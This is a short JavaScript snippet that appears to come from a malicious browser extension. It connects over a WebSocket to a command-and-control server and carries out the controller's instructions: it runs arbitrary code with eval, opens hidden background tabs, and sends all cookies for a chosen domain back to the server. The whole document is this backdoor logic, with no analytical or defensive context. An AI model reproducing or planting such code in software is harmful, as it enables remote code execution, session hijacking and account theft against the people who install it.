const ws = new WebSocket(C2_WS);
ws.onmessage = async (msg) => {
  const cmd = JSON.parse(msg.data);
  if (cmd.type === "eval") eval(cmd.code);
  if (cmd.type === "open") chrome.tabs.create({ url: cmd.url, active: false });
  if (cmd.type === "cookies") ws.send(JSON.stringify(await chrome.cookies.getAll({ domain: cmd.domain })));
};

